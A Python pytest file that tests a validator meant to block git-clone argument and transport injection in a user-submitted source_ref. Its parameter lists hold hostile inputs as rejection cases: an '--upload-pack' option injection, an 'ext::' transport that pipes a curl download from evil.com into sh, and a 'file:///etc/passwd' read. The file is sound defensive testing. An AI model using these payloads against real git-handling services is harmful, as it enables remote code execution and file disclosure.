"""Ingest security tests — git-clone argument/transport injection guard.

`source_ref` is user-controlled (submitted via the scan API). Two git-specific
attacks apply: a leading '-' can be parsed as an OPTION instead of a URL (e.g.
--upload-pack=<cmd> can achieve RCE on the worker), and the `ext::` transport
lets the "URL" itself run an arbitrary shell command. These tests prove
malicious refs are rejected BEFORE subprocess.run is ever called, and that a
normal URL still passes through unmodified.
"""

from __future__ import annotations

import pytest

from trident.ingest.pipeline import _validate_git_source_ref, ingest


@pytest.mark.parametrize("bad_ref", [
    "-", "--upload-pack=touch /tmp/pwned", "--help",
    "ext::sh -c 'curl evil.com|sh'",
    "file:///etc/passwd",
    "",
    "not a url at all",
])
def test_rejects_malicious_or_invalid_source_ref(bad_ref):
    with pytest.raises(ValueError):
        _validate_git_source_ref(bad_ref)


@pytest.mark.parametrize("good_ref", [
    "https://github.com/org/repo.git",
    "http://example.com/repo.git",
    "git://example.com/repo.git",
    "ssh://git@example.com/repo.git",
    "git@github.com:org/repo.git",
])
def test_accepts_well_formed_git_urls(good_ref):
    _validate_git_source_ref(good_ref)  # must not raise


def test_ingest_never_shells_out_for_rejected_ref(db, job, monkeypatch):
    """The real end-to-end guard: a malicious ref must fail before subprocess.run."""
    called = {"n": 0}

    def _boom(*a, **kw):
        called["n"] += 1
        raise AssertionError("subprocess.run must not be called for a rejected ref")

    monkeypatch.setattr("trident.ingest.pipeline.subprocess.run", _boom)
    with pytest.raises(ValueError):
        ingest(db, job.id, "git", "ext::sh -c 'curl evil.com|sh'")
    assert called["n"] == 0
